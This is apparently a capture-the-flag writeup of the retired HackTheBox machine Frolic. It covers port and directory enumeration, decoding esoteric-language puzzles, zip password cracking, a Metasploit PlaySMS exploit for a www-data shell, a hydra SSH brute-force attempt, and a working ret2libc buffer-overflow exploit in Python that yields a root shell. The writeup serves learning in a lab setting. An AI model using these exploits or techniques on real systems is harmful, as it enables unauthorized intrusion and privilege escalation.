---
layout: post
title: "Buffer Overflow on HackTheBox Frolic - with Metasploit"
description: "Rooting Frolic using Metasploit."
tags: pentest hackthebox writeup
---

This series will follow my exercises in [HackTheBox][]. All published writeups are for retired HTB machines. Whether
 or not I use Metasploit to pwn the server will be indicated in the title.
 
# Frolic

_<small>Difficulty: Easy</small>_

_<small>Machine IP: 10.10.10.111</small>_

I start off, as always, with a couple of port scans.

```bash
sudo nmap -sS -T4 -p- 10.10.10.111

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 14:30 EDT
Nmap scan report for 10.10.10.111
Host is up (0.014s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1880/tcp open  vsat-control
9999/tcp open  abyss

Nmap done: 1 IP address (1 host up) scanned in 16.06 seconds
```

```bash
sudo nmap -sS -T4 -A -p 22,139,445,1880,9999 10.10.10.111
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 14:33 EDT
Nmap scan report for 10.10.10.111
Host is up (0.066s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1880/tcp open  http        Node.js (Express middleware)
|_http-title: Node-RED
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 3.18 (95%), Linux 4.2 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:                                                                                              
|_clock-skew: mean: -1h44m08s, deviation: 3h10m31s, median: 5m51s                                                 
|_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)                         
| smb-os-discovery:                                                                                               
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)                                                                         
|   Computer name: frolic                                                                                         
|   NetBIOS computer name: FROLIC\x00                                                                             
|   Domain name: \x00                                                                                             
|   FQDN: frolic                                                                                                  
|_  System time: 2020-06-25T00:09:53+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-24T18:39:53
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   83.22 ms 10.10.14.1
2   83.64 ms 10.10.10.111
```

I am particularly interested in seeing that `tcp/1880` and `tcp/9999` are web servers.

Since SMB is also open on this machine, I try to access SMB shares, but none are exposed.

```bash
smbmap -u "" -H 10.10.10.111

[+] Guest session       IP: 10.10.10.111:445    Name: 10.10.10.111                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (frolic server (Samba, Ubuntu))
```

I start my enumeration with `gobuster`.

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x txt,php -u http://10.10.10.111:1880/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.111:1880/
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php
[+] Timeout:        10s
===============================================================
2020/06/24 14:56:51 Starting gobuster
===============================================================
/icons (Status: 401)
/red (Status: 301)
/vendor (Status: 301)
/settings (Status: 401)
/Icons (Status: 401)
/nodes (Status: 401)
/SETTINGS (Status: 401)
/flows (Status: 401)
/ICONS (Status: 401)
===============================================================
2020/06/24 15:10:34 Finished
===============================================================
```

Nothing particularly interesting on `tcp/1880`, let's check `tcp/9999` before digging in deeper.

`nikto` highlights several interesting endpoints, `/admin`, `/backup`, and `/test`.

```bash
nikto -host http://10.10.10.111:9999/

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.111
+ Target Hostname:    10.10.10.111
+ Target Port:        9999
+ Start Time:         2020-06-24 14:46:46 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.10.3 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ nginx/1.10.3 appears to be outdated (current is at least 1.14.0)
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /backup/: This might be interesting...
+ /test/: Output from the phpinfo() function was found.
+ OSVDB-3092: /test/: This might be interesting...
+ /test/index.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /test/index.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ /admin/index.html: Admin login page/section found.
+ 7865 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2020-06-24 14:49:20 (GMT-4) (154 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Simultaneously running `gobuster` reveals an additional endpoint of interest - `/dev`.

```bash
gobuster dir -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -u http://10.10.10.111:9999/

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.111:9999/
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php
[+] Timeout:        10s
===============================================================
2020/06/24 14:52:23 Starting gobuster
===============================================================
/admin (Status: 301)
/test (Status: 301)
/dev (Status: 301)
/backup (Status: 301)
/loop (Status: 301)
===============================================================
2020/06/24 15:02:01 Finished
===============================================================
```

Let's start looking at these endpoints.

As `nikto` found, navigating to `/test` reveals the output of `phpinfo()`. This has a bunch of information about the target system, but is not particularly interesting to me at this time. I note that it's there to review later if I need it.

![phpinfo test page][phpinfo]

One particular interesting item is where the web server is located on the file system.

```php
$_SERVER['SCRIPT_FILENAME']	/var/www/html/test/index.php
```

On `http://10.10.10.111:9999/backup` I find what appears to be a list of files underneath this directory.

![backup dirlist][]

Sure enough, I find a pair of credentials here.

![backup user][]

![backup pass][]

Looking back, these appear to be a red herring but, ok, for now let's note them down as possible credentials.

On `http://10.10.10.111:9999/admin` I find a login page. The credentials from `/backup` do not work. Inspecting the source code, I see the form doesn't actually submit a web request. Instead, it runs a `validate()` function. I also see that a `js/login.js` script is imported by this page.

![login source][]

Let's check out its contents. Looks like I found the credentials to `/admin`.

![login source creds][]

Upon successful login to the `/admin` form, I get to a page with a cipher on it.

> ….. ….. ….. .!?!! .?… ….. ….. …?. ?!.?. ….. ….. ….. ….. ….. ..!.? ….. ….. .!?!! .?… ….. ..?.? !.?.. ….. ….. ….! ….. ….. .!.?. ….. .!?!! .?!!! !!!?. ?!.?! !!!!! !…! ….. ….. .!.!! !!!!! !!!!! !!!.? ….. ….. ….. ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?… ….. ….. ….! ?!!.? ….. ….. ….. .?.?! .?… ….. ….. …!. !!!!! !!.?. ….. .!?!! .?… …?. ?!.?. ….. ..!.? ….. ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?…. ….. ….. …!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ….. ….. ….. .!?!! .?… ….. ….. …?. ?!.?. ….. !…. ….. ..!.! !!!!! !.!!! !!… ….. ….. ….! .?… ….. ….. ….! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?… ….! ?!!.? ….. .?.?! .?… ….. ….! .?… ….. ….. ..!?! !.?.. ….. ….. ..?.? !.?.. !.?.. ….. ..!?! !.?.. ….. .?.?! .?… .!.?. ….. .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!… ….. …!. ?…. ….. !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ….. ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !…. ….. ….. ….. !.!.? ….. ….. .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ….. ….! ?!!.? ….. ….. ?.?!. ?…. ….. ….. ..!.. ….. ….. .!.?. ….. …!? !!.?! !!!!! !!?.? !.?!! !!!.? ….. ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ….. …!? !!.?. ….. ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ….. ..!?! !.?.. ….. .?.?! .?… .!.?. ….. ….. ….. .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ….. ..!.! !!!!! !.?.

I googled around trying to figure out what this is, but wasn't successful. I ended up dumping this entire thing into Google, which brought up a link to the Wikipedia page for the [Ook! programming language][ook]. It looks like I can execute Ook! code on <https://www.splitbrain.org/_static/ook/>.

The result I get back is:

> Nothing here check /asdiSIAJJ0QWE9JAS

All right, it's one of these servers. I navigate to `http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS`.

Here I get more encoded content.

> UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA

Putting this content into a file and viewing it with `vim`, I notice there are spaces between these lines of content. I remove them with the `vim` command `:s/ //g`.

I then try to decode this message as `bas64` on a hunch. I get symbols back, but I don't get a base64 error, so I know I am on the right track. I put the base64-decoded content into a file and see if my system will tell me what it is. It looks like I've decoded a `.zip` file.

![second cipher zip][]

I try `unzip` but it is password-protected. Luckily, zip passwords are easy to crack. I can do so with [fcrackzip][]. My favorite wordlist to use for this kind of thing is `rockyou.txt`.

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt second_cipher.zip 

PASSWORD FOUND!!!!: pw == password
```

The cracking is nearly instantaneous. Should have tried guessing that to begin with. Unzipping this archive reveals a single file, `index.php`. The content of the file is:

> 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b797
>37250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7
>973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b79737550437
>3674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5
>330744c5330674c6a77724b7973670d0a4b317374506973674b7973725046306750697
>3724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7
>973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b317
>3674c5434744c5330675046302b4c5330674c5330744c533467504373724b797367577
>9302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a

Here we go again. This content looks like it is hex-encoded. I head over to [CyberChef][], provided by the wonderful [GCHQ][]. If you'd rather not use their GitHUb Pages site, CyberChef can be downloaded and run entirely locally from an html file and some js.

The hex-decoded content is easily identifiable as base64 so I add that rule to CyberChef and see the result.

![cyberchef results][]

I know from past CTF experiences that this is the beloved [brainfuck programming language][brainfuck]. There is another decoder to use, <https://www.dcode.fr/brainfuck-language>, and this reveals the content:

> idkwhatispass

Seems I've reached the end of this exercise, and got what is probably a password to something.

I don't have a clear next direction, so I return to performing additional enumeration. I run `gobuster` against the directories I've previously found and discover a few additional items under `/dev`.

```bash
gobuster dir -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.111:9999/dev/ -x txt,php

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.111:9999/dev/
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php
[+] Timeout:        10s
===============================================================
2020/06/24 15:45:12 Starting gobuster
===============================================================
/test (Status: 200)
/backup (Status: 301)
===============================================================
2020/06/24 15:53:17 Finished
===============================================================
```

Navigating to `http://10.10.10.111:9999/dev/backup` returns a page with the content `/playsms`. `http://10.10.10.111:9999/dev/backup/playsms` doesn't return anything. `http://10.10.10.111:9999/playsms` resolves, however, and gives me a login page for [PlaySMS][].

The default PlaySMS user is `admin`. I take the password I found, `idkwhatispass`, and successfully login to the service.

Additionally, it appears that PlaySMS is vulnerable to several exploits.

```bash
searchsploit playsms
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metaspl | php/remote/44598.rb
PlaySMS - index.php Unauthenticated Template Injection Code Execution (Metaspl | php/remote/48335.rb
PlaySms 0.7 - SQL Injection                                                    | linux/remote/404.pl
PlaySms 0.8 - 'index.php' Cross-Site Scripting                                 | php/webapps/26871.txt
PlaySms 0.9.3 - Multiple Local/Remote File Inclusions                          | php/webapps/7687.txt
PlaySms 0.9.5.2 - Remote File Inclusion                                        | php/webapps/17792.txt
PlaySms 0.9.9.2 - Cross-Site Request Forgery                                   | php/webapps/30177.txt
PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Up | php/webapps/42003.txt
PlaySMS 1.4 - 'import.php' Remote Code Execution                               | php/webapps/42044.txt
PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Met | php/remote/44599.rb
PlaySMS 1.4 - Remote Code Execution                                            | php/webapps/42038.txt
PlaySMS 1.4.3 - Template Injection / Remote Code Execution                     | php/webapps/48199.txt
------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Most interesting to me is the code execution module in Metasploit. Let's try it out. Searching in Metasploit, I find three modules relevant to `playsms`.

- `exploit/multi/http/playsms_filename_exec`
- `exploit/multi/http/playsms_template_injection`
- `exploit/multi/http/playsms_uploadcsv_exec`

The `searchsploit` results mentioned `CSV File Upload Code Execution` so I'll try the third module. It gets me a user shell as `www-data`.

Time to move to Information Gathering on the target system.

I see that there are two users on the system, `ayush` and `sahay`.

```bash
www-data@frolic:~/html/playsms$ ls -la /home
ls -la /home
total 16
drwxr-xr-x  4 root  root  4096 Sep 23  2018 .
drwxr-xr-x 22 root  root  4096 Sep 23  2018 ..
drwxr-xr-x  3 ayush ayush 4096 Sep 25  2018 ayush
drwxr-xr-x  7 sahay sahay 4096 Sep 25  2018 sahay
```

I have collected several passwords at this point, so let's try brute forcing an SSH login as either of these two users with any of those passwords.

```bash
hydra -L users.txt -P passwords.txt ssh://10.10.10.111

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-24 16:08:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:2/p:4), ~1 try per task
[DATA] attacking ssh://10.10.10.111:22/
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-24 16:08:08
```

It is not successful. However, I can read the user flag from `/home/ayush/user.txt` as the `www-data` user.

In the `ayush` home directory, there is a `.binary` directory with a SETUID binary.

```bash
www-data@frolic:/home/ayush/.binary$ ls -la
ls -la
total 16
drwxrwxr-x 2 ayush ayush 4096 Sep 25  2018 .
drwxr-xr-x 3 ayush ayush 4096 Sep 25  2018 ..
-rwsr-xr-x 1 root  root  7480 Sep 25  2018 rop
```

The fact that it has the SUID sticky bit set (`-rws`) means that when I execute this file, I will execute it with the privileges of the user of the file, which is `root`. That this file is named `rop` ([return oriented programming][rop]) makes me think this will require a buffer overflow.

Sure enough, inspecting the system calls that the binary makes with `ltrace` shows that it runs `setuid(0)` to run as root and then copies our input into a buffer.

```bash
www-data@frolic:/home/ayush/.binary$ ltrace ./rop id
ltrace ./rop id
__libc_start_main(0x804849b, 2, 0xbffffe84, 0x8048540 <unfinished ...>
setuid(0)                                        = -1
strcpy(0xbffffd88, "id")                         = 0xbffffd88
printf("[+] Message sent: ")                     = 18
printf("id")                                     = 2
+++ exited (status 0) +++
```

I can confirm a vulnerable buffer overflow by sending in some large input.

```bash
www-data@frolic:/home/ayush/.binary$ ./rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
Segmentation fault (core dumped)
```

I got a segfault, so there's a buffer overflow here. Because it has the SUID bit set, I am sure this is how to escalate my privileges.

I begin by identifying the overflow offset - the amount of input at which the buffer begins to overflow. I use `pattern_create` and `pattern_offset` on Kali to identify this.

I base64-encode the `rop` file, copy the base64 result, and decode it on my local machine so I can develop an exploit against this file.

```bash
gdp ./rop
```

```bash
artis3n@kali-pop:~/shares/htb/frolic$ msf-pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

Using this pattern as the input to `rop`, `gdb` tells me what was in the buffer at the time I hit the segfault.

```bash
gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

```bash
Program received signal SIGSEGV, Segmentation fault.
0x62413762 in ?? ()
```

I take `0x62413762` and pass it to `pattern_offset` to identify how many bytes long I need to pad my payload to overflow the buffer.

```bash
artis3n@kali-pop:~$ msf-pattern_offset -q 0x62413762
[*] Exact match at offset 52
```

`52` it is.

Now returning to the target machine, I need to get the memory address of the `libc` library used by the file.

```bash
www-data@frolic:/home/ayush/.binary$ ldd rop
ldd rop
        linux-gate.so.1 =>  (0xb7fda000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
        /lib/ld-linux.so.2 (0xb7fdb000)
```

I see that it is using `/lib/i386-linux-gnu/libc.so.6` from the `0xb7e19000` address in memory.

I then need to grab the memory location of several symbols from `libc.so.6` so I can invoke them in our exploit. From `libc.so.6` I need the memory address of the executables `system`, `exit`, and `/bin/sh`. Knowing these, I can craft an exploit known as [ret2libc][], or "return-to-libc."

```bash
www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i system
grep -i systemb/i386-linux-gnu/libc.so.6 |  
   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```

The memory address of `system@@GLIBC_2.0` is `0x0003ada0`.

```bash
www-data@frolic:~/html/playsms$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i exit  
-i exit -s /lib/i386-linux-gnu/libc.so.6 | grep  
   112: 0002edc0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10
   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
   450: 0002edf0   197 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18
   558: 000b07c8    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0
   616: 00115fa0    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0
   652: 0002eda0    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10
   876: 0002ebf0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3
  1046: 0011fb80    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0
  1394: 001b2204     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1
  1506: 000f3870    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0
  1849: 000b07c8    24 FUNC    WEAK   DEFAULT   13 _Exit@@GLIBC_2.1.1
  2108: 001b2154     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0
  2263: 0002e9f0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0
  2406: 000f4c80     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2
```

The memory address of `exit@@GLIBC_2.0` is `0x0002e9d0`.

For `/bin/sh`, since it is not a system call, I have to find the memory address by grepping for it among the human-readable text in `libc.so.6`.

```bash
www-data@frolic:~/html/playsms$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
p "/bin/sh"x /lib/i386-linux-gnu/libc.so.6 | gre 
 15ba0b /bin/sh
```

And I see the memory address of `/bin/sh` is `0x0015ba0b`.

I put all of this together in a Python exploit.

```python
#!/usr/bin/env python

import struct

buffersled = "A"*52

libc = 0xb7e19000
system = struct.pack('<I', libc + 0x0003ada0)
exit = struct.pack('<I', libc + 0x0002e9d0)
binsh = struct.pack('<I', libc + 0x0015ba0b)

payload = buffersled + system + exit + binsh

print payload
```

The memory addresses I got for `system`, `exit`, and `/bin/sh` are in relation to the memory address of `libc`, so I need to add the hex value of each memory address to `libc`'s hex value to get the correct position in memory. I pack the memory addresses with `<I` for [little-endian][]. And I `print` the payload to turn it into the input for our `rop` program.

I test the python script and see it does appear to generate the 52-byte buffer sled and then my hex code. I base64-encode the python script to move it onto my target.

```
artis3n@kali-pop:~/shares/htb/frolic$ python exploit.py 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�=���y��
                                                            J��
artis3n@kali-pop:~/shares/htb/frolic$ cat exploit.py | base64 -w 0
IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCgppbXBvcnQgc3RydWN0CgpidWZmZXJzbGVkID0gIkEiKjUyCgpsaWJjID0gMHhiN2UxOTAwMApzeXN0ZW0gPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDAzYWRhMCkKZXhpdCA9IHN0cnVjdC5wYWNrKCc8SScsIGxpYmMgKyAweDAwMDJlOWQwKQpiaW5zaCA9IHN0cnVjdC5wYWNrKCc8SScsIGxpYmMgKyAweDAwMTViYTBiKQoKcGF5bG9hZCA9IGJ1ZmZlcnNsZWQgKyBzeXN0ZW0gKyBleGl0ICsgYmluc2gKCnByaW50IHBheWxvYWQKCg==
```

I then store the code into a file.

```bash
www-data@frolic:/dev/shm$ echo -n IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCgppbXBvcnQgc3RydWN0CgpidWZmZXJzbGVkID0gIkEiKjUyCgpsaWJjID0gMHhiN2UxOTAwMApzeXN0ZW0gPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDAzYWRhMCkKZXhpdCA9IHN0cnVjdC5wYWNrKCc8SScsIGxpYmMgKyAweDAwMDJlOWQwKQpiaW5zaCA9IHN0cnVjdC5wYWNrKCc8SScsIGxpYmMgKyAweDAwMTViYTBiKQoKcGF5bG9hZCA9IGJ1ZmZlcnNsZWQgKyBzeXN0ZW0gKyBleGl0ICsgYmluc2gKCnByaW50IHBheWxvYWQKCg== | base64 -d > exploit.py
```

And I can confirm the python script has made it.

```bash
www-data@frolic:/dev/shm$ cat exploit.py
cat exploit.py
#!/usr/bin/env python

import struct

buffersled = "A"*52

libc = 0xb7e19000
system = struct.pack('<I', libc + 0x0003ada0)
exit = struct.pack('<I', libc + 0x0002e9d0)
binsh = struct.pack('<I', libc + 0x0015ba0b)

payload = buffersled + system + exit + binsh

print payload

www-data@frolic:/dev/shm$
```

With my payload on the box, I just need to call `rop` and pass in the output of the python script's execution. And I get a root shell.

```bash
www-data@frolic:/home/ayush/.binary$ ./rop $(python /dev/shm/exploit.py)

./rop $(python /dev/shm/exploit.py)
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

I can now collect the root flag.

[brainfuck]: https://en.wikipedia.org/wiki/Brainfuck
[cyberchef]: https://gchq.github.io/CyberChef/
[fcrackzip]: https://github.com/hyc/fcrackzip
[gchq]: https://www.gchq.gov.uk/
[hackthebox]: https://www.hackthebox.eu
[little-endian]: https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html
[playsms]: https://playsms.org/
[ook]: https://esolangs.org/wiki/Ook!
[ret2libc]: https://en.wikipedia.org/wiki/Return-to-libc_attack
[rop]: https://ctf101.org/binary-exploitation/return-oriented-programming/

[backup dirlist]: /assets/img/htb/frolic/backup-dir.png
[backup pass]: /assets/img/htb/frolic/backup-pass.png
[backup user]: /assets/img/htb/frolic/backup-user.png
[cyberchef results]: /assets/img/htb/frolic/third-cipher-to-brainfuck.png
[login source]: /assets/img/htb/frolic/9999-login-source.png
[login source creds]: /assets/img/htb/frolic/9999-login-creds-source.png
[phpinfo]: /assets/img/htb/frolic/phpinfo-test-page.png
[second cipher zip]: /assets/img/htb/frolic/second-cipher-decode.png
